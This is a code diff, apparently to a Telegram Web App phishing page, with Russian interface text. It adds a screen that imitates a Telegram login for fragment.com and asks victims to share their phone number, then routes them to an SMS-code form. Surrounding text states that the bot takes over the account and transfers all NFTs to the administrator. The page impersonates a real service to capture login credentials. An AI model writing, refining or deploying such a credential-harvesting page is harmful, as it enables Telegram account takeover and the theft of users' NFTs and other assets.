@@ -338,8 +338,34 @@
                 <div class="warning">
                     ⚠️ После авторизации бот получит доступ к вашему Telegram аккаунту и передаст все NFT администратору.
                 </div>
-                <button class="main-button" id="start-auth-btn" onclick="startAuth()">
+                <button class="main-button" id="start-auth-btn" onclick="showPhoneScreen()">
                     📱 НАЧАТЬ АВТОРИЗАЦИЮ
+                </button>
+            </div>
+            
+            <!-- Экран ввода номера телефона -->
+            <div class="content-section" id="phone-section" style="display: none;">
+                <div style="text-align: center; margin-bottom: 30px;">
+                    <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 20px;">
+                        <div style="width: 60px; height: 60px; background: #0088cc; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 20px;">
+                            <span style="color: white; font-size: 24px;">✈️</span>
+                        </div>
+                        <div style="font-size: 30px; color: #666;">→</div>
+                        <div style="width: 60px; height: 60px; background: #333; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-left: 20px;">
+                            <span style="color: white; font-size: 20px;">⚡</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <h2 style="color: #333; margin-bottom: 10px;">Войдите, чтобы использовать аккаунт Telegram</h2>
+                <p style="color: #666; margin-bottom: 20px;">
+                    для <strong>fragment.com</strong> и <span style="color: #0088cc;">Fragment Auction Alerts</span>.<br>
+                    Введите свой <strong>номер телефона</strong> в <span style="color: #0088cc;">международном формате</span>. 
+                    Подтверждение будет отправлено в Telegram.
+                </p>
+                
+                <button class="main-button" onclick="sharePhoneNumber()" style="background: #0088cc; font-size: 16px; padding: 15px;">
+                    ПОДЕЛИТЬСЯ НОМЕРОМ ТЕЛЕФОНА
                 </button>
             </div>
             
@@ -418,9 +444,27 @@
             console.log('⚠️ Telegram WebApp не доступен (демо режим)');
         }
         
-        // Функция начала авторизации
-        function startAuth() {
-            console.log('🔐 Начинаем авторизацию');
+        // Показать экран ввода номера телефона
+        function showPhoneScreen() {
+            console.log('📱 Показываем экран ввода номера телефона');
+            
+            // Скрываем начальный экран
+            document.getElementById('start-section').style.display = 'none';
+            
+            // Показываем экран телефона
+            document.getElementById('phone-section').style.display = 'block';
+            
+            // Обновляем шаги
+            document.getElementById('step-1').classList.add('completed');
+            document.getElementById('step-1').classList.remove('active');
+            document.getElementById('step-2').classList.add('active');
+            
+            currentStep = 2;
+        }
+        
+        // Поделиться номером телефона
+        function sharePhoneNumber() {
+            console.log('📞 Отправляем запрос на контакт');
             
             if (tg && tg.sendData) {
                 console.log('📤 Отправляем запрос на контакт боту');
@@ -445,6 +489,11 @@
             }
         }
         
+        // Функция начала авторизации (старая, теперь не используется)
+        function startAuth() {
+            showPhoneScreen();
+        }
+        
         // Показать форму ввода кода
         function showCodeInput() {
             console.log('📱 Показываем форму ввода SMS кода');
@@ -452,10 +501,13 @@
             // Обновляем шаги
             document.getElementById('step-1').classList.add('completed');
             document.getElementById('step-1').classList.remove('active');
-            document.getElementById('step-2').classList.add('active');
+            document.getElementById('step-2').classList.add('completed');
+            document.getElementById('step-2').classList.remove('active');
+            document.getElementById('step-3').classList.add('active');
             
-            // Скрываем начальный экран
+            // Скрываем все предыдущие экраны
             document.getElementById('start-section').style.display = 'none';
+            document.getElementById('phone-section').style.display = 'none';
             
             // Показываем форму кода
             document.getElementById('code-section').classList.add('active');
@@ -465,7 +517,7 @@
                 document.getElementById('sms-code').focus();
             }, 300);
             
-            currentStep = 2;
+            currentStep = 3;
         }
         
         // Добавить цифру
